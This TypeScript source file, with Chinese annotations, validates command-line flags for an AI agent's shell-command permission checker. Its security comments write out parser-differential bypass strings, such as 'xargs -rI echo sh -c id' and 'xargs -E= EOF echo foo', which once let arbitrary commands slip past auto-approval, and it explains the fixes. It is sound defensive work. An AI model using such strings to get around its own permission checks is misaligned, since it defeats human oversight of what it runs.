// `FLAG_PATTERN` 决定「什么样的 token 算标志」。它以 `-` 开头且紧跟字母/数字/下划线/连字符——注意它只锚定开头，所以 `-A20`、`--repo=x` 都算标志，而 `-`、`--` 单独出现不算（长度与字符都不满足），交给主循环的特判处理。

/**
 * Validates flag arguments based on their expected type
 */
export function validateFlagArgument(
  value: string,
  argType: FlagArgType,
): boolean {
  switch (argType) {
    case 'none':
      return false // Should not have been called for 'none' type
    case 'number':
      return /^\d+$/.test(value)
    case 'string':
      return true // Any string including empty is valid
    case 'char':
      return value.length === 1
    case '{}':
      return value === '{}'
    case 'EOF':
      return value === 'EOF'
    default:
      return false
  }
}
// `validateFlagArgument` 按类型判值，`none` 分支直接 `return false`——这是刻意的「不该被调用」断言：若调用方对 `none` 类型来取值，说明前面的分支已经错了，宁可判不安全。`char` 要求长度恰为 1（分隔符），`{}` 与 `EOF` 是字面量匹配（xargs 的 replace-str 与 heredoc 定界符）。

/**
 * Validates the flags/arguments portion of a tokenized command against a config.
 * This is the flag-walking loop extracted from BashTool's isCommandSafeViaFlagParsing.
 *
 * @param tokens - Pre-tokenized args (from bash shell-quote or PowerShell AST)
 * @param startIndex - Where to start validating (after command tokens)
 * @param config - The safe flags config
 * @param options.commandName - For command-specific handling (git numeric shorthand, grep/rg attached numeric)
 * @param options.rawCommand - For additionalCommandIsDangerousCallback
 * @param options.xargsTargetCommands - If provided, enables xargs-style target command detection
 * @returns true if all flags are valid, false otherwise
 */
// `validateFlags` 是整条链的核心：从命令名之后开始走 token，逐个判「是不是合法标志、吃不吃参、参数值是否可接受」，任何一步不确定就返回 false。它的默认方向是「不认识 → 不安全」，所有宽松处理都必须写明白理由。
export function validateFlags(
  tokens: string[],
  startIndex: number,
  config: ExternalCommandConfig,
  options?: {
    commandName?: string
    rawCommand?: string
    xargsTargetCommands?: string[]
  },
): boolean {
  let i = startIndex

  while (i < tokens.length) {
    let token = tokens[i]
    if (!token) {
      i++
      continue
    }

    // Special handling for xargs: once we find the target command, stop validating flags
    if (
      options?.xargsTargetCommands &&
      options.commandName === 'xargs' &&
      (!token.startsWith('-') || token === '--')
    ) {
      if (token === '--' && i + 1 < tokens.length) {
        i++
        token = tokens[i]
      }
      if (token && options.xargsTargetCommands.includes(token)) {
        break
      }
      return false
    }
// xargs 特判：xargs 之后的第一个非标志 token 就是它要执行的**目标命令**，从那里起不该再由本表校验（目标命令有自己的白名单元数据）。若目标不在允许集合里，立即返回 false——这堵住了「用 xargs 把任意命令塞进一条看似只读的管道」的路径。

    if (token === '--') {
      // SECURITY: Only break if the tool respects POSIX `--` (default: true).
      // Tools like pyright don't respect `--` — they treat it as a file path
      // and continue processing subsequent tokens as flags. Breaking here
      // would let `pyright -- --createstub os` auto-approve a file-write flag.
      if (config.respectsDoubleDash !== false) {
        i++
        break // Everything after -- is arguments
      }
      // Tool doesn't respect --: treat as positional arg, keep validating
      i++
      continue
    }
// 双短横线处理分岔：`respectsDoubleDash !== false` 时在 `--` 处 break，其后全是位置参数（POSIX 约定）；否则把 `--` 当普通位置参数继续校验。默认值是 true，只有像 pyright 那样明确不吃这套的工具才需要显式关掉。

    if (token.startsWith('-') && token.length > 1 && FLAG_PATTERN.test(token)) {
      // Handle --flag=value format
      // SECURITY: Track whether the token CONTAINS `=` separately from
      // whether the value is non-empty. `-E=` has `hasEquals=true` but
      // `inlineValue=''` (falsy). Without `hasEquals`, the falsy check at
      // line ~1813 would fall through to "consume next token" — but GNU
      // getopt for short options with mandatory arg sees `-E=` as `-E` with
      // ATTACHED arg `=` (it doesn't strip `=` for short options). Parser
      // differential: validator advances 2 tokens, GNU advances 1.
      //
      // Attack: `xargs -E= EOF echo foo` (zero permissions)
      //   Validator: inlineValue='' falsy → consumes EOF as -E arg → i+=2 →
      //     echo ∈ SAFE_TARGET_COMMANDS_FOR_XARGS → break → AUTO-ALLOWED
      //   GNU xargs: -E attached arg=`=` → EOF is TARGET COMMAND → CODE EXEC
      //
      // Fix: when hasEquals is true, use inlineValue (even if empty) as the
      // provided arg. validateFlagArgument('', 'EOF') → false → rejected.
      // This is correct for all arg types: the user explicitly typed `=`,
      // indicating they provided a value (empty). Don't consume next token.
      const hasEquals = token.includes('=')
      const [flag, ...valueParts] = token.split('=')
      const inlineValue = valueParts.join('=')
// 这一段是 `hasEquals` 与 `inlineValue` 的拆分，修的是一个零权限 RCE：`xargs -E= EOF echo foo`。校验器若用「inlineValue 是否非空」来判断「有没有内联值」，`-E=` 的内联值是空串（falsy），于是转去吞下一个 token（`EOF`）当参数，接着把 `echo` 认成 xargs 目标命令并放行；而 GNU getopt 对短选项不剥 `=`，`-E=` 的参数就是 `=` 本身，`EOF` 成了目标命令——真的执行 `EOF`。修法：用「token 里是否含 `=`」判断，含则一律取内联值（哪怕是空串），不吞下一个 token。

      if (!flag) {
        return false
      }

      const flagArgType = config.safeFlags[flag]

      if (!flagArgType) {
        // Special case: git commands support -<number> as shorthand for -n <number>
        if (options?.commandName === 'git' && flag.match(/^-\d+$/)) {
          // This is equivalent to -n flag which is safe for git log/diff/show
          i++
          continue
        }
// git 的 `-<数字>` 简写（`git log -5`）单独放行，等价于 `-n 5`。这条只在 commandName 为 git 时启用——同一个 `-5` 在别的命令里可能是未知标志，不能全局放宽。

        // Handle flags with directly attached numeric arguments (e.g., -A20, -B10)
        // Only apply this special handling to grep and rg commands
        if (
          (options?.commandName === 'grep' || options?.commandName === 'rg') &&
          flag.startsWith('-') &&
          !flag.startsWith('--') &&
          flag.length > 2
        ) {
          const potentialFlag = flag.substring(0, 2) // e.g., '-A' from '-A20'
          const potentialValue = flag.substring(2) // e.g., '20' from '-A20'

          if (config.safeFlags[potentialFlag] && /^\d+$/.test(potentialValue)) {
            // This is a flag with attached numeric argument
            const flagArgType = config.safeFlags[potentialFlag]
            if (flagArgType === 'number' || flagArgType === 'string') {
              // Validate the numeric value
              if (validateFlagArgument(potentialValue, flagArgType)) {
                i++
                continue
              } else {
                return false // Invalid attached value
              }
            }
          }
        }
// grep/rg 的粘连数字（`-A20`、`-B10`）在未知标志分支里单独处理：拆成前缀 `-A` 与后缀 `20`，只有前缀在表里且后缀是纯数字、且前缀类型为 `number` 或 `string` 时才放行。这比「整串不认识就拒绝」宽松一档，但限制了宽松的形态。

        // Handle combined single-letter flags like -nr
        // SECURITY: We must NOT allow any bundled flag that takes an argument.
        // GNU getopt bundling semantics: when an arg-taking option appears LAST
        // in a bundle with no trailing chars, the NEXT argv element is consumed
        // as its argument. So `xargs -rI echo sh -c id` is parsed by xargs as:
        //   -r (no-arg) + -I with replace-str=`echo`, target=`sh -c id`
        // Our naive handler previously only checked EXISTENCE in safeFlags (both
        // `-r: 'none'` and `-I: '{}'` are truthy), then `i++` consumed ONE token.
        // This created a parser differential: our validator thought `echo` was
        // the xargs target (in SAFE_TARGET_COMMANDS_FOR_XARGS → break), but
        // xargs ran `sh -c id`. ARBITRARY RCE with only Bash(echo:*) or less.
        //
        // Fix: require ALL bundled flags to have arg type 'none'. If any bundled
        // flag requires an argument (non-'none' type), reject the whole bundle.
        // This is conservative — it blocks `-rI` (xargs) entirely, but that's
        // the safe direction. Users who need `-I` can use it unbundled: `-r -I {}`.
        if (flag.startsWith('-') && !flag.startsWith('--') && flag.length > 2) {
          for (let j = 1; j < flag.length; j++) {
            const singleFlag = '-' + flag[j]
            const flagType = config.safeFlags[singleFlag]
            if (!flagType) {
              return false // One of the combined flags is not safe
            }
            // SECURITY: Bundled flags must be no-arg type. An arg-taking flag
            // in a bundle consumes the NEXT token in GNU getopt, which our
            // handler doesn't model. Reject to avoid parser differential.
            if (flagType !== 'none') {
              return false // Arg-taking flag in a bundle — cannot safely validate
            }
          }
          i++
          continue
        } else {
          return false // Unknown flag
        }
      }
// 短标志 bundle 的硬规则：**只要有一个成员吃参数，整串拒绝**。理由写在上面注释里——GNU getopt 的 bundle 语义是「吃参数的选项若在末尾且无后续字符，就吞下一个 argv」，于是 `xargs -rI echo sh -c id` 里的 `-I` 会吞掉 `echo` 作为 replace-str，真正执行的是 `sh -c id`；而校验器只按存在性检查 `-r` 与 `-I` 都在表里，然后前进一格，把 `echo` 当成安全目标命令放行。拒绝整串是保守方向，代价是用户必须写成 `-r -I {}`。

      // Validate flag arguments
      if (flagArgType === 'none') {
        // SECURITY: hasEquals covers `-FLAG=` (empty inline). Without it,
        // `-FLAG=` with 'none' type would pass (inlineValue='' is falsy).
        if (hasEquals) {
          return false // Flag should not have a value
        }
        i++
// `none` 类型却带了 `=`（如 `--color=`）一律拒绝。没有这条，`-FLAG=` 的内联值是空串，会从「构造值」分支溜过去，被当成合法的无值标志，从而与真实程序的解析产生错位。
      } else {
        let argValue: string
        // SECURITY: Use hasEquals (not inlineValue truthiness). `-E=` must
        // NOT consume next token — the user explicitly provided empty value.
        if (hasEquals) {
          argValue = inlineValue
          i++
        } else {
          // Check if next token is the argument
          if (
            i + 1 >= tokens.length ||
            (tokens[i + 1] &&
              tokens[i + 1]!.startsWith('-') &&
              tokens[i + 1]!.length > 1 &&
              FLAG_PATTERN.test(tokens[i + 1]!))
          ) {
            return false // Missing required argument
          }
          argValue = tokens[i + 1] || ''
          i += 2
        }
// 缺参判定：下一个 token 不存在，或它本身是个合法形态的标志，就判「缺参 → 不安全」。后半条尤其重要——它防止 `--output --help` 这种「本该吃参数却吃到另一个标志」的构造被当成合法，进而让真正的危险标志溜到后面被位置参数兜底放行。

        // Defense-in-depth: For string arguments, reject values that start with '-'
        // This prevents type confusion attacks where a flag marked as 'string'
        // but actually takes no arguments could be used to inject dangerous flags
        // Exception: git's --sort flag can have values starting with '-' for reverse sorting
        if (flagArgType === 'string' && argValue.startsWith('-')) {
          // Special case: git's --sort flag allows - prefix for reverse sorting
          if (
            flag === '--sort' &&
            options?.commandName === 'git' &&
            argValue.match(/^-[a-zA-Z]/)
          ) {
            // This looks like a reverse sort (e.g., -refname, -version:refname)
            // Allow it if the rest looks like a valid sort key
          } else {
            return false
          }
        }
// `string` 参数以 `-` 开头一律拒绝，唯一例外是 git 的反向排序键（`--sort=-refname`）。这条是纵深防御：某个标志若在真实程序里其实不吃参数，却被我们标成 `string`，攻击者就能把 `--dangerous-flag` 塞成它的值，让我们「合法消费」掉一个危险标志，而程序把那个 token 当自己的选项解析。

        // Validate argument based on type
        if (!validateFlagArgument(argValue, flagArgType)) {
          return false
        }
      }
    } else {
      // Non-flag argument (like revision specs, file paths, etc.) - this is allowed
      i++
    }
  }

  return true
// 非标志的位置参数一律放行（`i++`），这是整张表的既定假设：写操作若只能通过位置参数触发，必须由各条目的 `additionalCommandIsDangerousCallback` 拦（`git tag`、`git branch` 就是范例）；没有回调的条目，等于声明「这个子命令的位置参数不可能是写操作」。函数返回 true 不代表命令安全，只代表「标志这一层没发现问题」。
}
